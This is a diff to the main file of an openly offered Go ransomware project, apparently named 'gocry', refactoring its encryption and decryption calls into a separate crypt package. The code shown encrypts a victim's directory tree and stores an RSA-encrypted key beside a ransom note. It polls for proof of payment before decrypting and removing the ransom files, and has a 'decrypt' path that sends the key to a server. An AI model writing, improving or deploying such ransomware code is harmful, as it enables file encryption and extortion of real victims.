@@ -19,6 +19,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/nireo/gocry/crypt"
 	"github.com/nireo/gocry/ransomware"
 	"github.com/nireo/gocry/utils"
 	"github.com/nireo/gocry/victim"
@@ -235,13 +236,13 @@ func main() {
 		log.Fatalf("bad public key: %s", err)
 	}
 
-	out, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubkey, ransomware.key, []byte("key.txt"))
+	out, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubkey, rw.Key, []byte("key.txt"))
 	if err != nil {
 		log.Fatalf("error while encrypting key content: %s", err)
 	}
 
-	ransomware.encryptDirectory(ransomware.rootDir)
-	if err := ioutil.WriteFile(ransomware.rootDir+"/key.txt", out, 0600); err != nil {
+	crypt.EncryptRoot(rw.RootDir, rw.Key)
+	if err := ioutil.WriteFile(rw.RootDir+"/key.txt", out, 0600); err != nil {
 		log.Fatalf("write output: %s", err)
 	}
 
@@ -262,24 +263,24 @@ func main() {
 		for {
 			fmt.Println()
 			fmt.Println("Checking key file...")
-			key, err := ioutil.ReadFile(ransomware.rootDir + "/key.txt")
+			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
 			if err != nil {
 				time.Sleep(time.Minute * 3)
 				continue
 			}
 
 			// check if the keys match
-			if bytes.Equal(key, ransomware.key) {
+			if bytes.Equal(key, rw.Key) {
 				// The ransom has been paid so decrypt the files..
-				ransomware.decryptDirectory(ransomware.rootDir)
+				crypt.DecryptRoot(rw.RootDir, rw.Key)
 				fmt.Println("Thank you for your cooperation!")
 
 				// remove the key and the ransom files.
-				if err := os.Remove(ransomware.rootDir + "/key.txt"); err != nil {
+				if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
 					log.Fatalf("error removing key file: %s", err)
 				}
 
-				if err := os.Remove(ransomware.rootDir + "/ransom.txt"); err != nil {
+				if err := os.Remove(rw.RootDir + "/ransom.txt"); err != nil {
 					log.Fatalf("error removing ransom file: %s", err)
 				}
 				break
@@ -307,7 +308,7 @@ func main() {
 			fmt.Println(uindef)
 		} else if text == "decrypt" {
 			// send the key to the database and get the decrypted key using the private rsa key from the server.
-			key, err := ioutil.ReadFile(ransomware.rootDir + "/key.txt")
+			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
 			if err != nil {
 				log.Fatalf("error reading key file: %s", err)
 			}
@@ -330,11 +331,11 @@ func main() {
 			}
 
 			// remove the old key file
-			if err := os.Remove(ransomware.rootDir + "/key.txt"); err != nil {
+			if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
 				log.Fatalf("error removing old key file: %s", err)
 			}
 
-			if err := ioutil.WriteFile(ransomware.rootDir+"/key.txt", deckey, 0600); err != nil {
+			if err := ioutil.WriteFile(rw.RootDir+"/key.txt", deckey, 0600); err != nil {
 				log.Fatalf("write output: %s", err)
 			}
 		}
